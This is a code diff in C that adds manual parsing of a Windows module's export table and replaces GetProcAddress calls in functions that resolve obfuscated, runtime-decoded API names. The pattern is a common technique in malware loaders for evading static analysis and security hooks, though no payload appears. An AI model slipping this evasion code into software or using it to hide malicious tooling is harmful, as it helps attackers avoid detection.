@@ -60,6 +60,28 @@ HMODULE PebLoadLibraryA(LPCSTR moduleName) {
   return NULL;
 }
 
+FARPROC PebGetProcAddress(HMODULE hModule, LPCSTR procName) {
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+
+    if (!exportDirRVA) return NULL;
+
+    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);
+    DWORD* nameRvas = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
+    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
+    DWORD* funcRvas = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+        char* name = (char*)hModule + nameRvas[i];
+        if (strcmp(name, procName) == 0) {
+            WORD ordinal = ordinals[i];
+            return (FARPROC)((BYTE*)hModule + funcRvas[ordinal]);
+        }
+    }
+
+    return NULL;
+}
 
 // Function to resolve the kernel32 dll 
 FARPROC ResolveKernel32Obf(const unsigned char *enc, HMODULE *dllModule, const unsigned char *dllNameEnc) {
@@ -76,7 +98,7 @@ FARPROC ResolveKernel32Obf(const unsigned char *enc, HMODULE *dllModule, const u
   char name[64];
   DecodeString(name, enc);
 
-  return GetProcAddress(*dllModule, name);
+  return PebGetProcAddress(*dllModule, name);
 }
 
 // Function to resolve dlls (needs kernel32 resolved)
@@ -97,5 +119,5 @@ FARPROC ResolveObf(const unsigned char *enc, HMODULE *dllModule, const unsigned 
   char name[64];
   DecodeString(name, enc);
 
-  return GetProcAddress(*dllModule, name);
+  return PebGetProcAddress(*dllModule, name);
 }
